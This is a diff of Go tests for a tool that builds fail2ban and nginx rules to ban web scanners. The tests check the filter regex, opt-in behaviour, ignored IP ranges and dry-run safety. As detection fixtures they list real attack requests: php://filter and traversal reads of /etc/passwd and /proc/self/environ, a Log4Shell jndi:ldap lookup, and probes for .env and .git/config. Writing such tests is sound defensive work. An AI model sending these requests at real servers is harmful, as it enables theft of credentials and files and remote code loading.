@@ -41,11 +41,10 @@ func TestFilterMatchesScannerLines(t *testing.T) {
 		"GET /.npmrc HTTP/1.1",
 		"GET /.DS_Store HTTP/1.1",
 		"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1",
-		"GET /?path=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1",
 		"GET /....//....//....//..../proc/self/environ HTTP/1.1",
-		"GET /download?file=../../etc/passwd HTTP/1.1",
-		"GET /?x=${jndi:ldap://203.0.113.5/a} HTTP/1.1",
 		"POST /.env HTTP/1.1",
+		"GET /a/etc/passwd HTTP/1.1",
+		"GET /${jndi:ldap/x HTTP/1.1",
 	} {
 		m := r.FindStringSubmatch(logLine(req))
 		if m == nil {
@@ -55,6 +54,29 @@ func TestFilterMatchesScannerLines(t *testing.T) {
 		if got := m[r.SubexpIndex("host")]; got != "203.0.113.9" {
 			t.Errorf("host for %q = %q", req, got)
 		}
+	}
+}
+
+// A page on another site can make a visitor's browser send these. Only the path may ban.
+func TestFilterIgnoresProbesInTheQueryString(t *testing.T) {
+	for _, php := range []bool{false, true} {
+		r := filterRegexp(t, php)
+		for _, req := range []string{
+			"GET /?x=/.env HTTP/1.1",
+			"GET /?path=php://filter/read=convert.base64-encode/resource=/etc/passwd HTTP/1.1",
+			"GET /download?file=../../etc/passwd HTTP/1.1",
+			"GET /page?next=/.git/config HTTP/1.1",
+			"GET /?x=${jndi:ldap://203.0.113.5/a} HTTP/1.1",
+			"GET /search?q=wp-login.php HTTP/1.1",
+		} {
+			if r.MatchString(logLine(req)) {
+				t.Errorf("php=%v: a query string triggered the filter: %s", php, req)
+			}
+		}
+	}
+	// the same path with a query string still matches, because the path is the probe
+	if !filterRegexp(t, false).MatchString(logLine("GET /.env?x=1 HTTP/1.1")) {
+		t.Error("a probe path with a query string was not matched")
 	}
 }
 
@@ -161,7 +183,7 @@ func TestPatternsAreSafeInShellAndNginxQuoting(t *testing.T) {
 func TestPHPTierOnlyWithoutFastcgiPass(t *testing.T) {
 	endsBlock := regexp.MustCompile(`\n\s*fi\n`)
 	for _, drop := range []bool{false, true} {
-		s := script(Options{NginxDropProbes: drop})
+		s := script(Options{NginxDropProbes: drop, NginxBanProbes: true})
 		mustContain(t, s, `grep -qE '^[[:space:]]*fastcgi_pass[[:space:]]'`, "PHPTIER=0", "PHPTIER=1",
 			"core list only (nginx has fastcgi_pass", "say nginx-php "+StateReport)
 		// PHPTIER is raised only in the else branch of the fastcgi_pass test
@@ -195,7 +217,7 @@ func TestPHPTierOnlyWithoutFastcgiPass(t *testing.T) {
 }
 
 func TestProbeJailIsItsOwnFileAndLeavesJailLocalAlone(t *testing.T) {
-	s := probeJailSection(Options{})
+	s := probeJailSection(Options{NginxBanProbes: true})
 	mustContain(t, s, "/etc/fail2ban/jail.d/baryovm-nginx-probes.local", "/etc/fail2ban/filter.d/baryovm-nginx-probes.conf",
 		"backend = auto", "logpath = $lp", "[baryovm-nginx-probes]", "fail2ban-client -t", "sudo cmp -s")
 	if strings.Contains(s, "[DEFAULT]") || strings.Contains(s, "[sshd]") {
@@ -208,11 +230,47 @@ func TestProbeJailIsItsOwnFileAndLeavesJailLocalAlone(t *testing.T) {
 		t.Error("a recidive jail was added, bantime.increment already escalates")
 	}
 	// the jail is written whenever nginx and fail2ban are there, flag or not
-	mustContain(t, script(Options{}), "say nginx-probes applied", "command -v nginx", "command -v fail2ban-client")
+	mustContain(t, script(Options{NginxBanProbes: true}), "say nginx-probes applied", "command -v nginx", "command -v fail2ban-client")
+}
+
+func TestProbeJailIsOptIn(t *testing.T) {
+	off := script(Options{})
+	for _, w := range []string{"[baryovm-nginx-probes]", `sudo install -m 644 -o root -g root "$NEWJAIL"`, `"maxretry = 5"`, "say nginx-probes applied", "say nginx-probes would-apply"} {
+		if strings.Contains(off, w) {
+			t.Errorf("without --nginx-ban-probes the script has %q", w)
+		}
+	}
+	mustContain(t, off, "say nginx-probes "+StateReport, "--nginx-ban-probes", "is available")
+	// a jail written by an earlier run is reported and kept, never removed or rewritten
+	mustContain(t, off, `sudo test -f "$PJAIL" || sudo test -f "$PFILTER"`, "left as it is")
+	if strings.Contains(off, `sudo rm -f "$PJAIL"`) || strings.Contains(off, `sudo rm -f "$PFILTER"`) {
+		t.Error("without the flag the script can delete an existing jail file")
+	}
+	mustContain(t, script(Options{NginxBanProbes: true}), "[baryovm-nginx-probes]", "say nginx-probes applied")
+}
+
+func TestProbeJailIgnoreIPKeepsDefaultsAndPrivateRanges(t *testing.T) {
+	s := script(Options{NginxBanProbes: true})
+	mustContain(t, s, "ignoreip = %(known/ignoreip)s 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 100.64.0.0/10 fc00::/7", `echo "maxretry = 5"`)
+	if strings.Contains(s, `"maxretry = 3"`) {
+		t.Error("maxretry is still 3")
+	}
+}
+
+func TestProbeJailReportsMissingRealIP(t *testing.T) {
+	s := script(Options{NginxBanProbes: true})
+	mustContain(t, s, `grep -qE '^[[:space:]]*set_real_ip_from[[:space:]]'`, "say nginx-realip "+StateReport, "would ban the proxy", "Configure set_real_ip_from first")
+	// the jail is still written, the report does not stop it
+	if i, j := strings.Index(s, "say nginx-realip"), strings.Index(s, "NEWFILT=$(mktemp)"); i < 0 || j < i {
+		t.Errorf("the real ip report (%d) must come before the jail is built (%d) and not replace it", i, j)
+	}
+	if strings.Contains(script(Options{}), "say nginx-realip") {
+		t.Error("the real ip report appears without the ban flag")
+	}
 }
 
 func TestProbeJailRestoresAndReloadsOnlyOnSuccess(t *testing.T) {
-	s := probeJailSection(Options{})
+	s := probeJailSection(Options{NginxBanProbes: true})
 	test := strings.Index(s, "fail2ban-client -t")
 	reload := strings.Index(s, "systemctl reload fail2ban")
 	restore := strings.Index(s, `sudo rm -f "$PFILTER"`)
@@ -227,7 +285,7 @@ func TestProbeJailRestoresAndReloadsOnlyOnSuccess(t *testing.T) {
 }
 
 func TestProbesDryRunWritesNothing(t *testing.T) {
-	s := script(Options{DryRun: true, NginxDropProbes: true})
+	s := script(Options{DryRun: true, NginxDropProbes: true, NginxBanProbes: true})
 	mustContain(t, s, "DRY=1", "say nginx-probes would-apply", "say nginx-drop would-apply")
 	// every write sits after the dry-run branch, in the else that follows it
 	for _, w := range []string{`sudo install -m 644 -o root -g root "$NEWFILT"`, `sudo install -m 644 -o root -g root "$NEWMAP"`, `sudo tee "$f" < "$EDITED"`} {
